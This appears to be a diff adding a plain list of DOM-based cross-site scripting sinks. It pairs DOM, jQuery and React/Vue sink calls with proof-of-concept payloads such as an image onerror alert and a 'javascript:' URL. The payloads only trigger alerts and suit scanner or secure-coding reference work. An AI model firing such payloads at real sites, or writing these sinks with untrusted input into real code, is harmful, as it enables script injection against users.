@@ -1,0 +1,52 @@
+document.write('<img src=x onerror=alert(1)>')
+document.writeln('<img src=x onerror=alert(1)>')
+document.body.innerHTML = '<img src=x onerror=alert(1)>'
+document.documentElement.innerHTML = '<img src=x onerror=alert(1)>'
+document.getElementById('x').innerHTML = '<img src=x onerror=alert(1)>'
+element.outerHTML = '<img src=x onerror=alert(1)>'
+element.insertAdjacentHTML('beforeend','<img src=x onerror=alert(1)>')
+element.setAttribute('href','javascript:alert(1)')
+element.setAttribute('src','javascript:alert(1)')
+element.setAttribute('action','javascript:alert(1)')
+location = 'javascript:alert(1)'
+location.href = 'javascript:alert(1)'
+location.assign('javascript:alert(1)')
+location.replace('javascript:alert(1)')
+window.open('javascript:alert(1)')
+eval(userInput)
+setTimeout(userInput,0)
+setInterval(userInput,0)
+new Function(userInput)()
+ScriptElement.src = userInput
+ScriptElement.text = userInput
+ScriptElement.textContent = userInput
+LinkElement.href = userInput
+IframeElement.srcdoc = userInput
+FormElement.action = userInput
+InputElement.formaction = userInput
+Object.defineProperty(document,'URL',{get:function(){return 'javascript:alert(1)'}})
+history.pushState({},'',' javascript:alert(1)')
+window.name = '<img src=x onerror=alert(1)>'
+# Additional DOM sinks
+document.domain = userInput
+document.cookie = userInput
+localStorage.setItem('key',userInput)
+sessionStorage.setItem('key',userInput)
+postMessage(userInput,'*')
+window.location.hash = userInput
+history.replaceState({},null,userInput)
+document.querySelector('style').textContent = userInput
+document.querySelector('script').textContent = userInput
+element.style.cssText = userInput
+element.style.backgroundImage = 'url('+userInput+')'
+document.designMode = 'on'
+document.execCommand('insertHTML',false,userInput)
+# jQuery sinks
+$('#div').html(userInput)
+$('#div').append(userInput)
+$('body').prepend(userInput)
+$(userInput)
+$.parseHTML(userInput)
+# React/Vue sinks
+dangerouslySetInnerHTML={{__html: userInput}}
+v-html="userInput"
